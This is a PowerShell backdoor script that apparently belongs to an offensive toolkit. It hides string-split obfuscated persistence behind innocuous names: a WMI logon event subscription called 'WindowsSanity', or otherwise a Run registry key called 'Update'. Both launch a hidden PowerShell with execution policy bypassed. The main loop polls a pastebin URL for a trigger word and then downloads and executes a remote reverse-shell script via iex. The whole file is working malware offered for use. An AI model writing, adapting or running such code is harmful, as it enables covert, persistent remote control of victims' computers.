$VerifyURL = "https://pastebin.com/raw/r10P01Ju"
$PayloadURL = "https://raw.githubusercontent.com/XZE3N/remps/main/windows_reverse_powershell/revscr.ps1"
$MagicWords = "start"
$StopWords = "stop"

#add persistency
$modulename = "backscr.ps1"
$name = "pe"+"rsis"+"t.vbs"
		Copy-Item "$env:temp\remps-main\windows_backdoor_powershell\backscr.ps1" -Destination "$env:temp" #drop the repository first using dropscr
		
        echo "Set "+"objShell = C"+"rea"+"teOb"+"ject(`"Wsc"+"ript.s"+"hel"+"l`")" > $env:TEMP\$name
        echo "ob"+"jSh"+"ell.run"+"(`"powe"+"rshell -W"+"indowStyle"+" Hidden"+" -execut"+"ionpol"+"icy by"+"pass -file"+" $env:t"+"emp\$mo"+"dulen"+"ame`")" >> $env:TEMP\$name
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
        {
            $scriptpath = $env:TEMP
            $scriptFileName = "$scr"+"iptpath"+"\$n"+"ame"
            $filterNS = "ro"+"ot\c"+"imv2"
            $wmiNS = "ro"+"ot\sub"+"scrip"+"tion"
            $query = @"
             Select * from __InstanceCreationEvent within 30 
             where targetInstance isa 'Win32_LogonSession' 
"@
            $filterName = "Wi"+"ndowsSa"+"nity"
            $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
            $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
        }
        else
        {
            New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
            echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
			echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        }

#main 
function A{
	while($true)
	{
	start-sleep -seconds 5
	$exec = 0
	$filecontent = (New-Object System.Net.WebClient).DownloadString("$VerifyURL")
	$filecontent = $filecontent.TrimEnd()
	if($filecontent -eq $MagicWords)
	{
		Write-Host "::Executing payload::" -ForegroundColor Green 
		iex(New-Object System.Net.WebClient).DownloadString($PayloadURL)
		$exec++
	}
	if ($exec -eq 1)
	{
    Start-Sleep -Seconds 60
	}
	elseif ($filecontent -eq $StopWords)
	{
	Write-Host "::Stopping::" -ForegroundColor Green
    break
	}
	echo "waiting for input..."
	}
}
A
